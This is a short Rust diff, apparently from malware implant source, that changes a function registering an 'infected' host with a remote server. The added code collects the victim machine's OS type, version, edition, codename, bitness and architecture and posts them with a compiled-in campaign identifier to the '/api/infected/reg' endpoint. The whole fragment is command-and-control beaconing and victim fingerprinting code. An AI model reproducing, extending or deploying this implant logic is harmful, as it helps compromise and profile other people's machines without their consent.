@@ -10,10 +10,18 @@ use crate::constants::compiled::{self, CCID, HTTP_URL};
 pub async fn request_iid() -> Result<String> {
     let client = Client::new();
 
+    let info = os_info::get();
+
     let res = client
         .post(HTTP_URL("/api/infected/reg"))
         .json(&json!({
-            "ccid": CCID
+            "ccid": CCID,
+            "osType": info.os_type(),
+            "osVersion": info.version().to_string(),
+            "osEdition": info.edition(),
+            "osCodeName": info.codename(),
+            "osBits": info.bitness(),
+            "osArch": info.architecture(),
         }))
         .timeout(Duration::from_secs(3))
         .send()
